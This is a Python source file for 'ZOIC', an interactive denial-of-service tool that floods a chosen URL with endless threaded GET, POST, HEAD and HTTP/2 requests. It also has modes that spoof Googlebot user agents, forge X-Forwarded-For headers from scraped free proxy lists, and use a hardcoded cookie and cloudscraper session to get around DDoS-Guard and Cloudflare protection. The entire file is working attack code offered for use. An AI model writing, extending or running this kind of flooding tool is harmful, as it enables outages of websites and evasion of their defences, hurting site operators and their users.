import os
import sys
import asyncio
import aiohttp
import aiosonic
import threading
import cloudscraper
import random
import time
import requests
import re
from aiohttp import TCPConnector
from aiohttp import ClientSession
from pystyle import Colorate, Colors

user_agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 7.1.2; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A605G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0"
]

proxy_sites = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
]

google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]

scraper = cloudscraper.create_scraper()

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_cyan, """

                    ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             
                    ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                    ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩     
                              
                ╔════════════════════════╗
                ║        [!help]         ║          https://rvlt.gg/PnjMbQwH 
                ║   Type to see command  ║
                ╚════════════════════════╝ 
                                                                   
"""))

def layer7():
    while True:
        logo()
        select = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@ZOIC]~$
╚══> """))
        
        if select == "!help" or select.lower() == "h":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Colorate.Horizontal(Colors.cyan_to_green,"""
                                      
                           ┬┬ ┬┌─┐┬  ┌─┐
                           │├─┤├┤ │  ├─┘
                           o┴ ┴└─┘┴─┘┴  
                                                                                    
        ╔═════════════════════════════════════════════════╗
        ║                                                 ║
        ║  - dgb   |  DDoS Guard Bypass with Request      ║
        ║  - cfb   |  CloudFlare Bypass with Request      ║
        ║  - get   |  GET Request Attack                  ║
        ║  - post  |  POST Request Attack                 ║
        ║  - head  |  HEAD Request Attack                 ║
        ║  - http2 |  HTTP 2.0 Request Attack             ║
        ║  - pxreq |  PROXY Request Attack                ║
        ║                                                 ║
        ║  - PLS PROJECT STAR                             ║
        ║  - GOD BLESS YOU                                ║
        ║                                                 ║  
        ╚═════════════════════════════════════════════════╝

"""))
            input(Colorate.Horizontal(Colors.blue_to_cyan, f"[+] Enter the continew..."))

        if select == "get" or select.lower() == "1":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                        if retries > 0:
                            await asyncio.sleep(2) 
                            await send_request(session, url, retries - 1)

            async def send_requests(url, get_request):
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = [send_request(session, url) for _ in range(get_request)]
                    await asyncio.gather(*tasks)

            def send_thread(url, get_request):
                while True:
                    asyncio.run(send_requests(url, get_request))

            def start_threads(url, num_threads, get_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, get_request))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)

                while True:
                    time.sleep(0.1)

            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))
            
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            
            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@REQUEST(100~1000)]~$
╚══> """)))
            
            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))

            start_threads(url, num_threads, get_request)


        elif select == "post" or select.lower() == "2":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }
                try:
                    async with session.post(url, headers=headers, ) as response:
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} POST Request : {post_request} Status : {response.status}"))
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                        if retries > 0:
                            await asyncio.sleep(2) 
                            await send_request(session, url, retries - 1)

            async def send_requests(url, post_request):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_request(session, url) for _ in range(post_request)]
                    await asyncio.gather(*tasks)

            def send_thread(url, post_request):
                while True:
                    asyncio.run(send_requests(url, post_request))

            def start_threads(url, num_threads, post_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, post_request))
                    thread.daemon = True  
                    thread.start()
                    threads.append(thread)

                while True:
                    time.sleep(0.1)  

            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))
            
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            
            post_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@REQUEST(100~1000)]~$
╚══> """)))
            
            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))    

            start_threads(url, num_threads, post_request)

        elif select == "head" or select.lower() == "3":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }

                try:
                    async with session.head(url, headers=headers,) as response:
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HEAD Request : {head_request} Status : {response.status}"))
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)  
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                        if retries > 0:
                            await asyncio.sleep(2) 
                            await send_request(session, url, retries - 1)
            

            async def send_requests(url, head_request):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_request(session, url) for _ in range(head_request)]
                    await asyncio.gather(*tasks)

            def send_thread(url, head_request):
                while True:
                    asyncio.run(send_requests(url, head_request))

            def start_threads(url, num_threads, head_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, head_request))
                    thread.daemon = True  
                    thread.start()
                    threads.append(thread)

                while True:
                    time.sleep(0.1)

            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))
            
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            
            head_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@REQUEST(100~1000)]~$
╚══> """)))
            
            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))    

            start_threads(url, num_threads, head_request)


        elif select == "http2" or select.lower() == "5":
                async def send_request(client, url, retries=3):
                    headers = {
                        "User-Agent": random.choice(user_agent),
                    }
                    try:
                        response = await client.get(url, headers=headers)
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status_code}"))
                    except aiosonic.exceptions.HttpParsingError:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                        if retries > 0:
                            await asyncio.sleep(2)
                            await send_request(client, url, retries - 1)
                    except asyncio.TimeoutError:
                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                        if retries > 0:
                            await asyncio.sleep(2)
                            await send_request(client, url, retries - 1)

                async def send_requests(url, get_request):
                    client = aiosonic.HTTPClient()
                    tasks = [send_request(client, url) for _ in range(get_request)]
                    await asyncio.gather(*tasks)

                def send_thread(url, get_request):
                    while True:
                        asyncio.run(send_requests(url, get_request))

                def start_threads(url, num_threads, get_request):
                    threads = []
                    for _ in range(num_threads):
                        thread = threading.Thread(target=send_thread, args=(url, get_request))
                        thread.daemon = True
                        thread.start()
                        threads.append(thread)

                    while True:
                        time.sleep(0.1)

                url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))

                num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))

                get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@REQUEST(100~1000)]~$
╚══> """)))

                print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))  

                start_threads(url, num_threads, get_request)

        elif select == "pxreq" or select.lower() == "p":
            def proxy_hunter(url):
                    proxies = []
                    try:
                        response = requests.get(url, timeout=5)
                        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)  
                        proxies.extend(proxy_list)
                    except Exception as e:
                        print(f"Error : {e}")
                    return proxies

            all_proxies = []
            for site in proxy_sites:
                    proxies = proxy_hunter(site)
                    all_proxies.extend(proxies)

            async def send_request(session, url, proxy, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                    "X-Forwarded-For": proxy,  
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} Proxy Request : {proxy} Status : {response.status}"))
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except asyncio.TimeoutError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server TIMEOUT by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)

            async def send_requests(url, proxy_list, get_request):
                async with aiohttp.ClientSession() as session:
                    tasks = [
                        send_request(session, url, random.choice(proxy_list)) for _ in range(get_request)
                    ]
                    await asyncio.gather(*tasks)


            def send_thread(url, proxy_list, get_request):
                while True:
                    asyncio.run(send_requests(url, proxy_list, get_request))

            def start_threads(url, proxy_list, num_threads, get_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, proxy_list, get_request))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)


                while True:
                    time.sleep(0.1)  

            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@GET-REQUEST(100~1000)]~$
╚══> """)))

            print(Colorate.Horizontal(Colors.green_to_blue,f"""
╔═══[root@PROXY]~$
╚══> {len(all_proxies)}"""))

            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))

            start_threads(url, all_proxies, num_threads, get_request)

        elif select == "dgb" or select.lower() == "d":
            def dgb_main(url):
                requests.get(f'{url}', cookies={'__ddg2': 'mionaganoharaisbestgirl'}).raise_for_status()
                print(Colorate.Horizontal(Colors.green_to_blue,f"""
╔═══[root@BYPASS]~$
╚══> {url}"""))
                requests.get(f'{url}').raise_for_status()

            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(google_agents)
                }

                try:
                    async with session.get(url, headers=headers) as response:
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)

            async def send_requests(url, get_request):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_request(session, url) for _ in range(get_request)]
                    await asyncio.gather(*tasks)

            def send_thread(url, get_request):
                while True:
                    asyncio.run(send_requests(url, get_request))

            def start_threads(url, num_threads, get_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, get_request))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)

                while True:
                    time.sleep(0.1)

            url = input(Colorate.Horizontal(Colors.green_to_blue, """
╔═══[root@URL]~$
╚══> """))
            
            dgb_main(url)

            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue, """
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
╔═══[root@GET-REQUEST(100~1000)]~$
╚══> """)))
            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))

            start_threads(url, num_threads, get_request)


        elif select == "cfb" or select.lower() == "c":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(google_agents),
                }
                try:
                    async with session.get(url, headers=headers) as response:  
                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))                                     
                except aiohttp.ClientConnectorError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)

            async def send_requests(url, get_request):
                session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                    headers=scraper.headers,  
                    cookies=scraper.cookies   
                )
                tasks = [send_request(session, url) for _ in range(get_request)]
                await asyncio.gather(*tasks)
                await session.close()

            def send_thread(url, get_request):
                while True:
                    asyncio.run(send_requests(url, get_request))

            def start_threads(url, num_threads, get_request):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, get_request))
                    thread.daemon = True  
                    thread.start()
                    threads.append(thread)

                while True:
                    time.sleep(0.1)

            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@URL]~$
╚══> """))
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@THREAD(5~30)]~$
╚══> """)))
            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
╔═══[root@GET-REQUEST(100~1000)]~$
╚══> """)))
            
            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))

            start_threads(url, num_threads, get_request)
            
    
             


if __name__ == "__main__":
    layer7()
